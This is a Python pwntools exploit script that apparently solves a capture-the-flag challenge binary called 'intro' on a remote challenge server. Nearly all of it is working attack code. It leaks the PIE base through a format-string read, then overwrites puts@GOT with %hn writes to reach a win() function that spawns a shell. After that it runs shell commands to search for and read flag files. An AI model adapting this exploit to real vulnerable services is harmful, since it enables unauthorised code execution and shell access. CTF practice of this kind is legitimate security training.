#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./intro')
context.log_level = 'info'

MAIN_OFFSET = 0x5c9
WIN_OFFSET = 0x53c
PUTS_GOT_OFFSET = 0x3018
FMT_BUF_POS = 20      # our buffer starts at printf positional arg 20
FMT_LEN = 40           # format specifiers padded to 40 bytes (8-byte aligned)
ADDRS_START_POS = FMT_BUF_POS + FMT_LEN // 8  # = 25

BAD_BYTES = {0x00, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x20, 0x25}

def has_bad_bytes(addr):
    """Check if lower 6 bytes of addr contain characters that break scanf or printf."""
    for b in p64(addr)[:6]:
        if b in BAD_BYTES:
            return True
    return False

def build_write_payload(win_addr, puts_got):
    """Build format string payload: 3x %hn writes to overwrite puts@GOT with win_addr."""
    # (value_16bit, target_address) pairs
    targets = [
        (win_addr & 0xffff, puts_got),
        ((win_addr >> 16) & 0xffff, puts_got + 2),
        ((win_addr >> 32) & 0xffff, puts_got + 4),
    ]
    # Sort by value so printf char-count is non-decreasing
    targets.sort(key=lambda x: x[0])

    count = 0
    fmt = b''
    for i, (value, _) in enumerate(targets):
        pos = ADDRS_START_POS + i  # 25, 26, 27
        pad = (value - count) % 0x10000
        if pad == 0:
            fmt += f'%{pos}$hn'.encode()
        else:
            fmt += f'%{pad}c%{pos}$hn'.encode()
        count = value

    # Pad format specifiers to FMT_LEN
    need = FMT_LEN - len(fmt)
    if need < 0:
        return None
    fmt += b'.' * need  # '.' is safe (not whitespace, not '%')

    # Append 8-byte addresses (significant 6 bytes + 2 null terminators)
    for _, addr in targets:
        fmt += p64(addr)

    return fmt

def try_exploit():
    if args.LOCAL:
        p = process('./intro')
    else:
        p = remote('chals.cyberjousting.com', 1367)

    # --- Iteration 1: leak PIE base ---
    p.recvuntil(b'Attempt 1: ')
    p.sendline(b'%39$p')
    resp = p.recvuntil(b'Try again.')

    # Parse: "Incorrect flag: 0xHEXADDR. Try again."
    try:
        part = resp.split(b'Incorrect flag: ')[1].split(b'.')[0].strip()
        main_addr = int(part, 16)
    except Exception as e:
        log.warning(f"Leak parse failed: {e}")
        p.close()
        return False

    pie_base = main_addr - MAIN_OFFSET
    if pie_base & 0xfff != 0:
        log.warning(f"PIE base not page-aligned: {hex(pie_base)}")
        p.close()
        return False

    win_addr = pie_base + WIN_OFFSET
    puts_got = pie_base + PUTS_GOT_OFFSET

    log.info(f"PIE base : {hex(pie_base)}")
    log.info(f"win()    : {hex(win_addr)}")
    log.info(f"puts@GOT : {hex(puts_got)}")

    # Check for problematic bytes
    if has_bad_bytes(puts_got):
        log.warning("puts@GOT has bad bytes for scanf, retrying...")
        p.close()
        return False

    # --- Iteration 2: format string write ---
    payload = build_write_payload(win_addr, puts_got)
    if payload is None:
        log.error("Payload too long")
        p.close()
        return False

    log.info(f"Payload length: {len(payload)} bytes")

    p.recvuntil(b'Attempt 2: ')
    p.sendline(payload)

    # puts(". Try again.") should now jump to win() → system("/bin/sh")
    sleep(0.5)

    # Check for shell
    p.sendline(b'echo PWNED')
    try:
        resp = p.recvuntil(b'PWNED', timeout=5)
        log.success("Got shell!")
    except Exception as e:
        log.warning(f"No shell: {e}")
        p.close()
        return False

    if args.LOCAL:
        p.sendline(b'id')
        log.info(p.recvline(timeout=3).decode(errors='replace').strip())
        p.interactive()
    else:
        # Grab the flag
        p.sendline(b'cat /flag* 2>/dev/null || cat flag* 2>/dev/null || find / -name "*flag*" -readable 2>/dev/null | head -5')
        sleep(1)
        try:
            output = p.recv(timeout=5)
            log.success(f"Output:\n{output.decode(errors='replace')}")
        except:
            pass
        p.sendline(b'ls -la')
        sleep(0.5)
        try:
            output = p.recv(timeout=3)
            log.info(f"ls:\n{output.decode(errors='replace')}")
        except:
            pass
        p.close()
    return True

for attempt in range(30):
    log.info(f"=== Attempt {attempt + 1} ===")
    try:
        if try_exploit():
            break
    except EOFError:
        log.warning("Connection closed (crash?)")
    except Exception as e:
        log.warning(f"Error: {e}")
